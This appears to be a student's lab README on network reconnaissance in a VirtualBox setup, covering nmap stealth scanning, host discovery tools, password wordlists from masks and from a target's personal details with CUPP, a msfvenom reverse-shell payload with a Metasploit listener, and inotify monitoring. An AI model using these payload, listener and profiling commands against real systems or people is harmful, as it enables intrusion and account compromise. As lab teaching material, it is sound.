# 🫧 Network Security & Reconnaissance Lab

<img width="1024" height="572" alt="image" src="https://github.com/user-attachments/assets/a2eabac0-4e07-4725-b292-6558a05390c0" />

---

This repository serves as a learning resource for network security fundamentals. It documents practical exercises in reconnaissance, host discovery, password profiling, and system monitoring.

## 🖥️ Lab Specifications
* Target IP: 10.0.2.4
* Attacker Platform: Kali Linux 
* Environment: Oracle VirtualBox
* Operating System: Linux
* Primary Vectors: Network scanning, automated password generation, and payload delivery.

## 1. Stealth Network Scanning
This exercise demonstrates how to perform a stealthy scan to identify open ports and the target operating system without completing the three-way handshake.
```
# Perform a stealth SYN scan (-sS), enable OS detection (-O), 
# and save output to a text file (-oN)
nmap -sS -O -oN target_scan.txt 10.0.2.4
```
#### Key Observations:
* identified multiple open ports including 21 (FTP), 22 (SSH), 80 (HTTP), and 3306 (MySQL).
* Successfully detected the target's MAC address and virtual environment (Oracle VirtualBox)

## 2. Local Host Discovery Tools
A comparison between `netdiscover` and `arp-scan` for mapping live hosts on a local subnet.
| Feature | `netdiscover` | `arp-scan` |
| :--- | :--- | :--- |
| Method | Passive and Active ARP requests | Active ARP requests to all IPs |
| Speed | Moderate | Very fast (Bulk packet sending) |
| Stealth | Supports passive mode | No passive mode available |
| Interface | Interactive menu | Script-friendly CLI |

## 3. Automated Wordlist Generation
Generating targeted wordlists is essential for security testing and password cracking exercises.
### A. Pattern-Based Generation with `mp64`
Generate passwords based on specific complexity requirements (e.g., 1-2 lowercase, 1 uppercase, 1-2 digits).
```
# Generate lists based on complexity patterns
mp64 -o wordlist.txt '?l?u?d?d'
mp64 -o wordlist_alt.txt '?l?l?u?d'

# Combine multiple lists for comprehensive testing
cat *.txt > combined_wordlist.txt
```
### B. Social Engineering Profiling with CUPP
The Common User Passwords Profiler creates wordlists based on a specific target's personal information.
```
# Launch the interactive profiler
python3 cupp.py -i
```
### Lab Example Input:
* Target: Po 
* Birthdate: 01051989
* Spouse/Pet: Jessie / Pop
* Result: Generated `po.txt` containing 4,868 potential passwords.

## 4. Payload Generation & Exploitation
Creating a reverse shell payload using `msfvenom` and handling the connection via Metasploit.
```
# 1. Generate the Windows Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o reverse_shell.exe

# 2. Setup the Multi-Handler Listener
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.2.15
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```
## 5. System Auditing with inotify
Monitoring file system events is crucial for detecting unauthorized modifications or deletions.
```
# Monitor the specific lab user directory for create, modify, and delete events
sudo inotifywait /home/cybr354exam -e create,modify,delete --timefmt '%Y-%m-%d %H:%M:%S' --format '%T %e %w%f'
```
Example Log Output:
```
2025-05-06 01:13:17 CREATE /home/cybr354exam/file.txt [cite: 166]
2025-05-06 01:13:31 MODIFY /home/cybr354exam/file.txt [cite: 166]
2025-05-06 01:13:36 DELETE /home/cybr354exam/file.txt [cite: 166]
```
